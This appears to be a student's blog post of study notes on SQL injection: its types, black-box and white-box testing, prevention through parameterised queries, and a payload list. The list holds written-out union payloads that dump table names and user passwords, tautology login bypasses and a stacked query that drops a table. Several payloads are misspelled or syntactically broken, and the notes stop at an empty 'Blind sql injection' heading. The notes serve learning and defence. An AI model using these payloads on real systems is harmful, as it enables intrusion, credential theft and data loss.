---
layout: post
title: You're up and running!
published: true
---
# SQL Injection Explained


SQL INJECTION : 
make notes for full sql too (revision)


 three types : 

1) In-Band(Classic) : 
types :  a) error : force database to give error to find backend logic and develop injection payload
b) union : combine two queries to make an attack 

2) Inferential(Blind) :  based on true false questiong queries
types : a) boolean : uses boolena condition .also called blind sqi .uses brute foce yes or no questions to 
extract information .

b) time : relies on databasepausing for a specified amount of time then returning
the results indicating a successful query execution . can be brute forced

3) Out-of-band (oast) : uses dns and http to the server to run queries in the server 
database and then run attacks




FINDING SQLI VILNARABILITIES : 

BLACK BOX AND white box testing 

a) black box testing : 
1) map he applicaion 
2) fuzz the applicaion : 
	> submit sql specific characters such as ' or ", and look for errors or 
	   other anomalies 

	> submit boolean condition such as or 1=1 or 1=2 for gettting true or false
	  for no response form error 

	> submit payloads designed to trigger time delays when executed within a sql query , and look for 
	  diffrences in the time taken to respond

	> Submit OAST payloads desgned to trigger out of band n/w internaction when executed within an sql query 
	  and monitor for any resulting interaction 



WHITE BOX TESTING :
a) ENABLE WEB SERVER LOGGING
b)enable database logging


	>Map the applicaion :
	  visible functinality in the application
	  regex search on all instances in the code thath talk to the databse

	> Code review:
	    allow code path for all input vecotrs 
	> test any sqli vulnarebility


write all attack syntaxes .



prevent sqli vulnarability. : 

1) perpared statement aka parapmetrized queries.

usage of .getParameter

2) stored procedure:  make functions and procedures and enter parameters to it .

3) allow list input validation : check if user input is valid or not 

4) cover escape character

sqli attacks : 

1) error fingerprinting : give wrong queries and then see the output error .
then use ' or "" to find how logic works 

"__ use this to comment out other section 

2) union based error . combine two queries to make an attack ( brute forcing number of columns and type of col int)
1) orderby clause  orderby 3 is out of range 
2) union select null :  select title,cost from product where id=1 union select null-- , "a"


3) check the number of columns bu multiple union queries 

chain command and add a query with a part 
select title from product where id = 1 and substring  = ) = 's'

out of band uses http request and dns  embedded within sql to give queries

use sql for  privelidge escalation  

xss:
open the url
and other steps

_________________________________________________________________________________________________________________________

sql injection :

\ or  ' for fingerprinting error 

making right side of query undetected

use -- query deliminator or #

finding number of columns : id = 1' order by 4 --+
do till error is not found 

to make left qery falseis to make -1


get database and function use union all select 1, database() , version() 

dumping database:

find table name 
union all select 1,table_name ,3 from information_Schema.tables --+

get security based table name 
union all select 1,table_name ,3 from information_Schema.tables where table_Schema = 'security' --+

group_concat

get list of tables
union all select 1,group_concat(table_name) ,3 from information_Schema.tables where table_Schema = database() --+


get all table data
union all select 1,group_concat(user_name , password) ,3 from  'users' --+ (users = table name)

dumping via sql : 
get current user

-5 union all select 1, current_user,8 --+



STEP 1 IS FINGERPRITING 

STEP 2 FIGURING OUT ALL INPUT PLACES WHERE PAYLOAD CAN BE EXECUTED

STEP 3 FIND THE PARAMETERS BEING ASKED FOR 

STEP 4 CONSTRUCT THE QUERY BASED ON THAT

TAUTOLOGY BASED SQL INJECTION : 
SELECT * FROM USER_DETAILS WHERE USERID = 'ABCD' AND PASSWORD = 'ANYTHING' OR 'X' = 'X'
select * from user_details where userid = 'abcd' and password = ''; drop table xyz -- ' ENTER PASSWORD AND THEN END QUERY AND START NEW 
QUERY

UNION BASED QUERY :

STEPS:
1) A NUMBER OF COLUMN AND ORDER OF COLUMNS OF ALL QUERIES MUST BE SAME 

2) THE DATA TYPES OF THE COLUMN OF EACH QUERY MUST BE SAME

3)USUALLY RETURNED COLUMN NAMES ARE TAKEN FROM THE FIRST QUERY 

SELECT * FROM USER_DETAILS WHERE USERID ='' UNION SELECT * FROM EMP_DETAILS --' AND PASSWORD = "ABCD'; AFTER --' QUERY IGNORED
LEARN USECASE OF SPECIAL CHARACTERS





SQL INJECTION payloads : 

1' --

1' --+ '
find out how many columns in table 

 1' order by 1 --+ '

and so on and continue by putting nos

and next try union 

-1 ' union all select 1,2,3,4,5,6,7 --+

can also use any no instead of 1,2,3 and also use abc

-1 ' union all select 1,database(),version() --+

-1 ' union all select 1,@@version() --+

dumping database : 

1' union all select 1, table_name , 3 from information_schema.tables --+

1' union all select 1, table_name , 3 from information_schema.tables = "security" --+

1' union all select 1, table_name , 3 from information_schema.tables = database() limit 0,1 --+ and so on 1,2   2,2   3,1


1' union all select 1, concat(table_name) , 3 from information_schema.tables --+


1' union all select 1, concat(table_name) , 3 from information_schema.columns where table_name = "newly found table name " --+


Injectiong with 'or' or 'and' :

1' union all select 1,2,3 or '1


1' union all select 1,2,3 and '0

and then use same as  database and version  and tablename


error based sql injection :
 when not understianding , to break query use /

other useful queries  : 

select count(*) from information_schema.tables

select table_name from information.schema.tables groupby table_schema;

select database();

select concat(select database(););


Blind sql injection  ::


